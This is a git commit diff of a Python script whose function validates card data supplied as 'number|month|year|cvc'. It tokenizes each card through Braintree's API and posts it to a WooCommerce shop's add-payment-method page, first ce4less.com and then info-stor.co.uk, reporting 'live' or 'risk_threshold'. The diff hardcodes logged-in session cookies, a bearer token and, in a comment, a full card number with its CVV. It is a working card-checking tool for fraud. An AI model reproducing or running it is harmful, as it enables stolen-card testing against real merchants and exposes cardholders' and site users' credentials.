d698102facb46eb1be69182fc4e2a1ba9195ae1d
yousef12102008 <moh552vbnm@gmail.com>
2024-06-19 15:40:26 +0300

    Update mk.py

--- mk.py
+++ mk.py
@@ -1,12 +1,6 @@
+import requests,re
 def Tele(ccx):
-		
-	import requests, re, base64, random, string, user_agent, time
-	from requests_toolbelt.multipart.encoder import MultipartEncoder
-	
-	from requests.packages.urllib3.exceptions import InsecureRequestWarning
-	
-	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-	
+	import requests
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -14,109 +8,19 @@ def Tele(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	
-	
 	r = requests.session()
 	
 
 
-
-
-	cookies = {
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    '_gcl_au': '1.1.1039263952.1717904732',
-    '_ga': 'GA1.1.1613173725.1717904732',
-    '_fbp': 'fb.1.1717904732684.350208071803167906',
-    'newpass_announce': 'true',
-    'cookielawinfo-checkbox-functional': 'yes',
-    'cookielawinfo-checkbox-performance': 'yes',
-    'cookielawinfo-checkbox-analytics': 'yes',
-    'cookielawinfo-checkbox-advertisement': 'yes',
-    'cookielawinfo-checkbox-others': 'yes',
-    'viewed_cookie_policy': 'yes',
-    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
-    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
-    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7',
-    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08',
-    'br_lgv_stat': 'default%7Cdefault',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_udata': 'vst%3D13%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_JVCGZDD7ML': 'GS1.1.1718778822.13.1.1718779969.57.0.1552856821',
-    '_uetsid': 'e002dc702e0511efbecd878f917d88b4',
-    '_uetvid': 'b873acf0261211efa5545d92dac21af2',
-}
-
-	headers = {
-    'authority': 'ce4less.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'no-cache',
-    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1039263952.1717904732; _ga=GA1.1.1613173725.1717904732; _fbp=fb.1.1717904732684.350208071803167906; newpass_announce=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C1e798985ca18d6a95c6fdeb1670a7a230852986c371511d8a796b428dac518d7; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=lyy446333%7C1719558308%7Cm7VryIOTmxcd5Ly4oAbAhm6F9gsApmqnwufpQkDhOYW%7C3c2a280ef9c0b1cd274212c09aee960f1f5391e73fbaebf0a62586a7c563da08; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D13%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JVCGZDD7ML=GS1.1.1718778822.13.1.1718779969.57.0.1552856821; _uetsid=e002dc702e0511efbecd878f917d88b4; _uetvid=b873acf0261211efa5545d92dac21af2',
-    'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/payment-methods/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = requests.get('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 	
-	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
 	
 
-
-	headers = {
-    'authority': 'ce4less.com',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://ce4less.com',
-    'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-	data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': client_token_nonce,
-}
-
-	response = requests.post('https://ce4less.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
-	
-	
-	
-	enc = response.json()['data']
-	
-	dec = base64.b64decode(enc).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-	
-	
-	
 
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-    'authorization': f'Bearer {au}',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg4ODY4NzUsImp0aSI6ImM1Njk3ODUyLWYxZDktNGQ2Ny1hYzRhLTkzYzBkMDRmMTI1NiIsInN1YiI6InRncHBoeWI1OWd3Z2NyaGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRncHBoeWI1OWd3Z2NyaGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.9ap3TQdc7mTFIzyDQuVaBW-in1QiaemKipchxPah3vP4VcMVjAoloEc4Kn4W-zuVNjTGdK2RWYrNjcie57lCTw',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -136,7 +40,7 @@ def Tele(ccx):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '379f0177-032a-47fd-9e6a-56561cd41a24',
+        'sessionId': '665eebdf-7380-4b4e-a24b-c22cdaaa8426',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -157,22 +61,58 @@ def Tele(ccx):
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"665eebdf-7380-4b4e-a24b-c22cdaaa8426"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 
 
-	tok = response.json()['data']['tokenizeCreditCard']['token']
+	tok=(response.json()['data']['tokenizeCreditCard']['token'])
+	
+	
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+	cookies = {
+    '_gcl_au': '1.1.1318228119.1717115597',
+    'woocommerce_multicurrency_forced_currency': 'GBP',
+    'woocommerce_multicurrency_language': 'en',
+    'moove_gdpr_popup': '%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-06-19%2012%3A33%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-06-19%2012%3A33%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'googtrans': '/en/ar',
+    'wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5': 'hdjfjkfkfofl%7C1720010031%7Cz9DqlW5YYT0U8NDt83eH26PZwiYWXowKIclHYTlFv83%7C2715fa716cb2520179168c8ff11cc75aa0322fc82cdff51e26e9e760582d0cfc',
+    'wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5': '6957%7C%7C1718973212%7C%7C1718969612%7C%7C88ecaed73c712a53b7711af316336fe0',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
+}
 
 	headers = {
-    'authority': 'ce4less.com',
+    'authority': 'www.info-stor.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://ce4less.com',
+    # 'cookie': '_gcl_au=1.1.1318228119.1717115597; woocommerce_multicurrency_forced_currency=GBP; woocommerce_multicurrency_language=en; moove_gdpr_popup=%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-19%2012%3A33%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-19%2012%3A33%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; googtrans=/en/ar; wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5=hdjfjkfkfofl%7C1720010031%7Cz9DqlW5YYT0U8NDt83eH26PZwiYWXowKIclHYTlFv83%7C2715fa716cb2520179168c8ff11cc75aa0322fc82cdff51e26e9e760582d0cfc; wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5=6957%7C%7C1718973212%7C%7C1718969612%7C%7C88ecaed73c712a53b7711af316336fe0; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
+    'origin': 'https://www.info-stor.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
+    'referer': 'https://www.info-stor.co.uk/account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -193,27 +133,26 @@ def Tele(ccx):
     'wc_braintree_credit_card_payment_nonce': tok,
     'wc_braintree_device_data': '',
     'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce-add-payment-method-nonce': '17abf93c74',
+    '_wp_http_referer': '/account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
-	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
-	
-	text = response.text
-	
-	pattern = r'Status code (.*?)\s*</li>'
+	response = requests.post('https://www.info-stor.co.uk/account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	text=(response.text)
+	import re
+	pattern = r"Status code \d+: (.+?)\s*</li>"
 	
 	match = re.search(pattern, text)
 	if match:
-		result = match.group(1)
-		if 'risk_threshold' in text:
-		    result = "RISK: Retry this BIN later."
+	    duplicate_message = match.group(1)
+	    return duplicate_message
 	else:
-		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-			result = "1000: Approved"
+		if 'Nice! New payment method added' in text:
+			return 'live'
+		elif 'risk_threshold' in text:
+			return 'risk_threshold'
 		else:
-			result = "Error"
-			
-	return result
+			print(text)
+			return 'risk_threshold'
 	
